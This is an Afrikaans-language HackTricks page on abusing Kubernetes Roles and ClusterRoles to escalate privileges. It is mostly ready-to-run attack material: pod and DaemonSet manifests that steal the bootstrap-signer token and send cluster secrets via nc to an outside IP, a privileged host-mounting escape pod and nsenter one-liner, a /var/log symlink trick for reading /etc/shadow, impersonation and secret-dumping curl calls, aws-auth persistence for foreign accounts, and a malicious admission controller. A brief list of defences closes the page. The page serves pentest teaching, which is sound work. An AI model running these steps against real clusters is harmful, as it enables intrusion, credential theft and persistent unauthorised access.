# Abusing Roles/ClusterRoles in Kubernetes

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

Hier kan jy 'n paar potensieel gevaarlike Rolle en ClusterRoles-konfigurasies vind.\
Onthou dat jy alle ondersteunde hulpbronne kan kry met `kubectl api-resources`

## **Bevoorregte Eskalasie**

Met die verwysing na die kunsvorm om **toegang tot 'n ander beginsel** binne die cluster te kry **met verskillende voorregte** (binne die Kubernetes-cluster of na eksterne wolke) as diegene wat jy reeds het, is daar in Kubernetes basies **4 hooftegnieke om voorregte te eskaleer**:

* In staat wees om ander gebruikers/groepe/SA's te **impersonate** met beter voorregte binne die Kubernetes-cluster of na eksterne wolke
* In staat wees om **pods te skep/patch/exec** waar jy **SA's kan vind of koppel** met beter voorregte binne die Kubernetes-cluster of na eksterne wolke
* In staat wees om geheime **te lees**, aangesien die SA-se tokens as geheime gestoor word
* In staat wees om te **ontsnap na die node** vanuit 'n houer, waar jy al die geheime van die houers wat op die node loop, die geloofsbriewe van die node, en die toestemmings van die node binne die wolk waarin dit loop (indien enige) kan steel
* 'n Vyfde tegniek wat 'n vermelding verdien, is die vermo√´ om **port-forward** in 'n pod uit te voer, aangesien jy moontlik toegang kan verkry tot interessante hulpbronne binne daardie pod.

### Toegang tot Enige Hulpbron of Werkwoord (Wildcard)

Die **wildcard (\*) gee toestemming oor enige hulpbron met enige werkwoord**. Dit word deur administrateurs gebruik. Binne 'n ClusterRole beteken dit dat 'n aanvaller enige naamruimte in die cluster kan misbruik.

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```

### Toegang tot enige hulpbron met 'n spesifieke werkwoord

In RBAC stel sekere toestemmings aansienlike risiko's in:

1. **`create`:** Verleen die vermo√´ om enige klusterhulpbron te skep, wat 'n risiko vir bevoorregte eskalasie inhou.
2. **`list`:** Maak dit moontlik om alle hulpbronne te lys, wat potensieel gevoelige data kan uitlek.
3. **`get`:** Maak dit moontlik om geheime van diensrekeninge te ontsluit, wat 'n veiligheidsrisiko inhou.

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```

### Pod Skep - Steel Token

'n Aanvaller met die regte om 'n pod te skep, kan 'n bevoorregte Diensrekening aan die pod heg en die token steel om die Diensrekening na te boots. Dit verhoog effektief die voorregte daarvan.

Voorbeeld van 'n pod wat die token van die `bootstrap-signer` diensrekening sal steel en dit na die aanvaller sal stuur:

```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```

### Pod Skep & Ontsnapping

Die volgende dui al die voorregte aan wat 'n houer kan h√™:

* **Bevoorregte toegang** (deaktivering van beskerming en instelling van vermo√´ns)
* **Deaktiveer namespaces hostIPC en hostPid** wat kan help om voorregte te eskaleer
* **Deaktiveer hostNetwork**-naamruimte, wat toegang gee om wolkvoorregte te steel en beter toegang tot netwerke te verkry
* **Monteer die / van die gasheer binne die houer**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

Skep die pod met:

```bash
kubectl --token $token create -f mount_root.yaml
```

Een-liner van [hierdie tweet](https://twitter.com/mauilion/status/1129468485480751104) en met 'n paar byvoegings:

```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```

Nou dat jy kan ontsnap na die node, kyk na post-exploitation tegnieke in:

#### Steels

Jy wil waarskynlik **steels** wees, op die volgende bladsye kan jy sien wat jy sal kan toegang as jy 'n pod skep wat slegs sommige van die genoemde voorregte in die vorige sjabloon aktiveer:

* **Voorregte + hostPID**
* **Slegs voorregte**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_Jy kan voorbeelde vind van hoe om die vorige voorregte pod-konfigurasies te skep/misbruik in_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Pod Skep - Beweeg na die wolk

As jy 'n **pod kan skep** (en opsioneel 'n **diensrekening**) kan jy moontlik **voorregte in die wolkomgewing bekom** deur **wolkrolle aan 'n pod of 'n diensrekening toe te ken** en dit dan te benader.\
Verder, as jy 'n **pod met die gasheer-netwerk-namespace kan skep**, kan jy die IAM-rol van die **node-instantie steel**.

Vir meer inligting, kyk na:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Skep/Herstel Deployment, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs en Cronjobs**

Dit is moontlik om hierdie toestemmings te **misbruik om 'n nuwe pod te skep** en voorregte te steel soos in die vorige voorbeeld.

Die volgende yaml **skep 'n daemonset en eksfiltreer die token van die SA** binne die pod:

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```

### **Pods Uitvoer**

**`pods/exec`** is 'n bron in Kubernetes wat gebruik word om **opdragte in 'n skil in 'n pod uit te voer**. Dit maak dit moontlik om **opdragte binne die houers uit te voer of 'n skil binne te gaan**.

Daarom is dit moontlik om **binne 'n pod in te gaan en die token van die SA te steel**, of om 'n bevoorregte pod binne te gaan, na die node te ontsnap, en al die tokens van die pods in die node te steel en die node te misbruik:

```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```

### port-forward

Hierdie toestemming maak dit moontlik om **een plaaslike poort na een poort in die gespesifiseerde peul te stuur**. Dit is bedoel om dit maklik te maak om programme wat binne 'n peul hardloop te ontleed, maar 'n aanvaller kan dit misbruik om toegang te verkry tot interessante (soos DB's) of kwesbare programme (webs?) binne 'n peul:

```
kubectl port-forward pod/mypod 5000:5000
```

### Gasheer Skryfbaar /var/log/ Ontsnapping

Soos [**aangedui in hierdie navorsing**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), as jy toegang het tot of 'n pod kan skep met die **gasheer se `/var/log/` gids gemonteer** daarop, kan jy **ontsnap uit die houer**.\
Dit is basies omdat wanneer die **Kube-API probeer om die logboeke** van 'n houer te kry (deur `kubectl logs <pod>` te gebruik), vra dit die `0.log`-l√™er van die pod op deur die `/logs/`-eindpunt van die **Kubelet**-diens te gebruik.\
Die Kubelet-diens stel die `/logs/`-eindpunt bloot wat basies net die **`/var/log`-l√™ersisteem van die houer blootstel**.

Daarom kan 'n aanvaller met **toegang om in die /var/log/ gids te skryf** van die houer hierdie gedrag op 2 maniere misbruik:

* Die `0.log`-l√™er van sy houer wysig (gewoonlik gele√´ in `/var/logs/pods/namespace_pod_uid/container/0.log`) om 'n **symboliese skakel te wees wat na `/etc/shadow` wys** byvoorbeeld. Dan sal jy in staat wees om gasheer se shadow-l√™er uit te voer deur die volgende te doen:

```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```

* As die aanvaller enige hoof met die regte om `nodes/log` te lees beheer, kan hy eenvoudig 'n **symlink** in `/host-mounted/var/log/sym` na `/` skep en wanneer hy **toegang verkry tot `https://<gateway>:10250/logs/sym/` sal hy die wortel-l√™erstelsel van die gasheer lys** (die verandering van die symlink kan toegang tot l√™ers bied).

```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```

**'n Laboratorium en outomatiese uitbuiting kan gevind word in** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Deur readOnly-beskerming te omseil <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

As jy gelukkig genoeg is en die hoogs bevoorregte vermo√´ `CAP_SYS_ADMIN` beskikbaar is, kan jy net die vouer hermonteer as rw:

```bash
mount -o rw,remount /hostlogs/
```

#### Om hostPath readOnly-beskerming te omseil <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Soos vermeld in [**hierdie navorsing**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html) is dit moontlik om die beskerming te omseil:

```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```

Dit was bedoel om ontsnappings soos die voriges te voorkom deur in plaas van 'n hostPath-mount te gebruik, 'n PersistentVolume en 'n PersistentVolumeClaim te gebruik om 'n gasheer se vouer in die houer te monteer met skryftoegang:

```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```

### **Impersonasie van bevoorregte rekeninge**

Met 'n [**gebruikersimpersonalisering**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) voorreg kan 'n aanvaller 'n bevoorregte rekening impersoneer.

Gebruik eenvoudig die parameter `--as=<gebruikersnaam>` in die `kubectl`-opdrag om 'n gebruiker te impersoneer, of `--as-group=<groep>` om 'n groep te impersoneer:

```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```

Of gebruik die REST API:

```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```

### Lys van Geheime

Die toestemming om **geheime te lys kan 'n aanvaller in staat stel om die geheime daadwerklik te lees** deur toegang te verkry tot die REST API-eindpunt:

```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```

### Lees 'n geheim - brute-force token IDs

Terwyl 'n aanvaller in besit van 'n token met leesregte die presiese naam van die geheim benodig om dit te gebruik, is daar steeds kwesbaarhede in teenstelling met die bre√´r _**lys geheime**_ voorreg. Standaarddiensrekeninge in die stelsel kan opgesom word, elk geassosieer met 'n geheim. Hierdie geheime het 'n naamstruktuur: 'n statiese voorvoegsel gevolg deur 'n ewekansige vyfkarakter alfanumeriese token (uitgesluit sekere karakters) volgens die [bronkode](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

Die token word gegenereer uit 'n beperkte 27-karakter stel (`bcdfghjklmnpqrstvwxz2456789`), eerder as die volle alfanumeriese reeks. Hierdie beperking verminder die totale moontlike kombinasies tot 14,348,907 (27^5). Gevolglik kan 'n aanvaller moontlik 'n brute-force aanval uitvoer om die token in 'n paar uur af te lei, wat moontlik kan lei tot voorregverhoging deur toegang tot sensitiewe diensrekeninge.

### Sertifikaatondertekeningversoeke

As jy die werkwoorde **`skep`** het in die bron `certificatesigningrequests` (of ten minste in `certificatesigningrequests/nodeClient`). Jy kan 'n nuwe CeSR van 'n nuwe node **skep**.

Volgens die [dokumentasie is dit moontlik om hierdie versoeke outomaties goed te keur](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), so in daardie geval **benodig jy nie ekstra toestemmings nie**. As dit nie die geval is nie, sal jy die versoek moet goedkeur, wat beteken dat jy moet opdateer in `certificatesigningrequests/approval` en `approve` in `signers` met bronNaam `<signerNameDomain>/<signerNamePath>` of `<signerNameDomain>/*`

'N **voorbeeld van 'n rol** met al die vereiste toestemmings is:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```

So, met die nuwe node CSR goedgekeur, kan jy die spesiale regte van nodes **misbruik** om geheime te **steel** en regte te **verhoog**.

In [**hierdie pos**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) en [**hierdie een**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) is die GKE K8s TLS Bootstrap-konfigurasie gekonfigureer met **outomatiese ondertekening** en dit word misbruik om geloofsbriewe van 'n nuwe K8s Node te genereer en dan daardie geloofsbriewe te misbruik om regte te verhoog deur geheime te steel.\
As jy **die genoemde regte het, kan jy dieselfde ding doen**. Let daarop dat die eerste voorbeeld die fout omseil wat voorkom dat 'n nuwe node toegang tot geheime binne houers kry, omdat 'n **node slegs toegang tot die geheime van houers wat daarop gemonteer is, kan kry**.

Die manier om dit te omseil, is om eenvoudig **'n node-geloofsbriewe vir die nodenaam waar die houer met die interessante geheime gemonteer is, te skep** (maar kyk net hoe om dit in die eerste pos te doen):

```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```

### AWS EKS aws-auth configmaps

Prinsipale wat **`configmaps`** in die kube-system-namespace op EKS (moet in AWS wees) klusters kan wysig, kan kluster-admin-voorregte verkry deur die **aws-auth**-configmap te oorskryf.\
Die werkwoorde wat nodig is, is **`update`** en **`patch`**, of **`create`** as die configmap nie geskep is nie:

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
Jy kan **`aws-auth`** gebruik vir **volharding** deur toegang aan gebruikers van **ander rekeninge** te gee.

Maar `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **werk nie vanaf 'n ander rekening** nie. Maar eintlik werk `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` as jy die ARN van die cluster plaas in plaas van net die naam.\
Om `kubectl` te laat werk, maak seker dat jy die **kubeconfig** van die slagoffer **konfigureer** en voeg `--profile other_account_role` by die aws exec-argumente sodat kubectl die profiel van die ander rekening gebruik om die token te kry en kontak te maak met AWS.
{% endhint %}

### Eskalering in GKE

Daar is **2 maniere om K8s-toestemmings aan GCP-prinsipale toe te ken**. In enige geval moet die prinsipaal ook die toestemming **`container.clusters.get`** h√™ om legitimasie te versamel om toegang tot die cluster te verkry, of jy sal jou eie kubectl-konfigurasie-l√™er moet **genereer** (volg die volgende skakel).

{% hint style="warning" %}
Wanneer jy met die K8s API-eindpunt praat, sal die **GCP-legitimasie-token gestuur** word. Dan sal GCP, deur die K8s API-eindpunt, eers **nagaan of die prinsipaal** (per e-pos) **toegang tot die cluster het**, en dan sal dit nagaan of dit **toegang via GCP IAM** het.\
As **enigeen** van daardie **waar** is, sal hy **geantwoord** word. As **nie**, sal 'n **fout** gegee word wat voorstel om **toestemmings via GCP IAM** te gee.
{% endhint %}

Die eerste metode is om **GCP IAM** te gebruik, die K8s-toestemmings het hul **ekwivalente GCP IAM-toestemmings**, en as die prinsipaal dit het, sal hy dit kan gebruik.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

Die tweede metode is om **K8s-toestemmings binne die cluster toe te ken** deur die gebruiker te identifiseer aan die hand van sy **e-pos** (GCP-diensrekeninge ingesluit).

### Skep diensrekeninge-token

Prinsipale wat **TokenRequests kan skep** (`serviceaccounts/token`) Wanneer jy met die K8s API-eindpunt praat, SAs (inligting van [**hier**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### ephemeralcontainers

Prinsipale wat **`update`** of **`patch`** **`pods/ephemeralcontainers`** kan doen, kan **kodes uitvoer op ander pods**, en moontlik **ontsnap** na hul node deur 'n ephemeral-container met 'n bevoorregte securityContext by te voeg.

### ValidatingWebhookConfigurations of MutatingWebhookConfigurations

Prinsipale met enige van die werkwoorde `create`, `update` of `patch` oor `validatingwebhookconfigurations` of `mutatingwebhookconfigurations` kan dalk in staat wees om **een van sulke webhookconfigurations te skep** om toestemmings te **eskaleer**.

Vir 'n voorbeeld van [`mutatingwebhookconfigurations, sien hierdie gedeelte van hierdie pos`](./#malicious-admission-controller).

### Eskaleer

Soos jy kan lees in die volgende gedeelte: [**Ingeboude Bevoorregte Eskalasie Voorkoming**](./#built-in-privileged-escalation-prevention), kan 'n prinsipaal nie rolle of clusterroles opdateer of skep sonder om self daardie nuwe toestemmings te h√™ nie. Behalwe as hy die **werkwoord `escalate`** oor **`roles`** of **`clusterroles`** het.\
Dan kan hy nuwe rolle skep of bestaande rolle opdateer met beter toestemmings as die een wat hy het.

### Nodes proxy

Prinsipale met toegang tot die **`nodes/proxy`** subbron kan kode op pods uitvoer via die Kubelet API (volgens [**hierdie**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)). Meer inligting oor Kubelet-outentifikasie op hierdie bladsy:

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Jy het 'n voorbeeld van hoe om [**RCE te kry deur geoutoriseerd met 'n Kubelet API te praat hier**](../pentesting-kubernetes-services/#kubelet-rce).

### Verwyder pods + onskeduleerbare nodes

Prinsipale wat **pods kan verwyder** (`delete` werkwoord oor `pods` bron), of **pods kan verdryf** (`create` werkwoord oor `pods/eviction` bron), of **pod-status kan verander** (toegang tot `pods/status`) en ander nodes **onskeduleerbaar kan maak** (toegang tot `nodes/status`) of **nodes kan verwyder** (`delete` werkwoord oor `nodes` bron) en beheer oor 'n pod het, kan pods van ander nodes **steel** sodat hulle in die **gekompromitteerde** **node** uitgevoer word en die aanvaller kan die tokens van daardie pods **steel**.

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### Dienste status (CVE-2020-8554)

Prinsipale wat **`dienste/status`** kan **verander**, kan die veld `status.loadBalancer.ingress.ip` stel om die **ongepaste CVE-2020-8554** uit te buit en **MiTM-aanvalle teen die kluster** te lanceer. Die meeste mitigasies vir CVE-2020-8554 voorkom slegs ExternalIP-dienste (volgens [**hierdie**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)).

### Status van knotpeunte en houers

Prinsipale met **`update`** of **`patch`** toestemmings oor `knotpeunte/status` of `houers/status`, kan etikette verander om skeduleringsbeperkings af te dwing.

## Ingeboude Privilege-Verhoging Voorkoming

Kubernetes het 'n [ingeboude meganisme](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) om privilege-verhoging te voorkom.

Hierdie stelsel verseker dat **gebruikers nie hul voorregte kan verhoog deur rolle of rolbindinge te verander nie**. Die afdwinging van hierdie re√´l vind plaas op die API-vlak en bied 'n beskerming selfs wanneer die RBAC-autoriseerder nie aktief is nie.

Die re√´l bepaal dat 'n **gebruiker slegs 'n rol kan skep of opdateer as hy al die toestemmings besit wat die rol bevat**. Verder moet die omvang van die gebruiker se bestaande toestemmings ooreenstem met di√© van die rol wat hy probeer skep of verander: √≥f oor die hele kluster vir ClusterRoles, √≥f beperk tot dieselfde naamspasie (of oor die hele kluster) vir Roles.

{% hint style="warning" %}
Daar is 'n uitsondering op die vorige re√´l. As 'n hoofbeginsel die **werkwoord `escalate`** oor **`roles`** of **`clusterroles`** het, kan hy die voorregte van rolle en clusterroles verhoog selfs sonder dat hy self die toestemmings het.
{% endhint %}

### **Kry & Verander RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**Blykbaar het hierdie tegniek vantevore gewerk, maar volgens my toetse werk dit nie meer nie om dieselfde rede wat in die vorige afdeling verduidelik is. Jy kan nie 'n rolbinding skep/verander om jouself of 'n ander SA sekere voorregte te gee as jy dit nie reeds het nie.**
{% endhint %}

Die voorreg om Rolebindings te skep, stel 'n gebruiker in staat om **rolle aan 'n diensrekening te bind**. Hierdie voorreg kan potensieel lei tot privilege-verhoging omdat dit die gebruiker in staat stel om administratiewe voorregte aan 'n gekompromitteerde diensrekening te bind.

## Ander Aanvalle

### Sykant-proksi-toepassing

Standaard is daar geen versleuteling in die kommunikasie tussen houers nie. Wederkerige outentifikasie, tweerigting, houer tot houer.

#### Skep 'n sykant-proksi-toepassing <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Skep jou .yaml

```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```

Wysig jou .yaml en voeg die uitgekommentarieerde lyne by:

```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```

Sien die logboeke van die proxy:

```bash
kubectl logs app -C proxy
```

Meer inligting by: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Skadelike Toelatingsbeheerder

'n Toelatingsbeheerder **onderskep versoek aan die Kubernetes API-bediener** voordat die objek volhard word, maar **nadat die versoek geoutentiseer en gemagtig is**.

As 'n aanvaller op een of ander manier daarin slaag om 'n Skadelike Toelatingsbeheerder in te spuit, sal hy in staat wees om **reeds geoutentiseerde versoek te wysig**. Dit kan potensieel privesc veroorsaak en meer gereeld in die cluster volhard.

**Voorbeeld van** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):

```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```

Kyk na die status om te sien of dit gereed is:

```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```

![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Implementeer dan 'n nuwe pod:

```bash
kubectl run nginx --image nginx
kubectl get po -w
```

Wanneer jy die `ErrImagePull`-fout sien, kontroleer die beeldnaam met een van die navrae:

```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```

![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

Soos u kan sien in die bo genoemde prentjie, het ons probeer om die beeld `nginx` uit te voer, maar die finale uitgevoerde beeld is `rewanthtammana/malicious-image`. Wat het nou gebeur!!?

#### Tegniese Besonderhede <a href="#heading-technicalities" id="heading-technicalities"></a>

Die `./deploy.sh` skrip stel 'n muterende webhook toelatingsbeheerder op, wat versoek na die Kubernetes API wysig soos gespesifiseer in sy konfigurasie re√´ls, wat die waargenome uitkomste be√Ønvloed:

```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```

Die bogenoemde snipper vervang die eerste kontainerbeeld in elke peul met `rewanthtammana/malicious-image`.

## Beste Praktyke

### **Deaktiveer outomatiese montasie van Diensrekeningtokens**

* **Peule en Diensrekeninge**: Standaard monteer peule 'n diensrekeningtoken. Om sekuriteit te verbeter, maak Kubernetes dit moontlik om hierdie outomatiese montasie-eienskap te deaktiveer.
* **Hoe om toe te pas**: Stel `automountServiceAccountToken: false` in die konfigurasie van diensrekeninge of peule in vanaf Kubernetes weergawe 1.6.

### **Beperkende Gebruikerstoewysing in RoleBindings/ClusterRoleBindings**

* **Selektiewe Insluiting**: Verseker dat slegs nodige gebruikers ingesluit word in RoleBindings of ClusterRoleBindings. Auditeer gereeld en verwyder onvanpaslike gebruikers om streng sekuriteit te handhaaf.

### **Naamruimte-spesifieke Rolle oor Klusterwye Rolle**

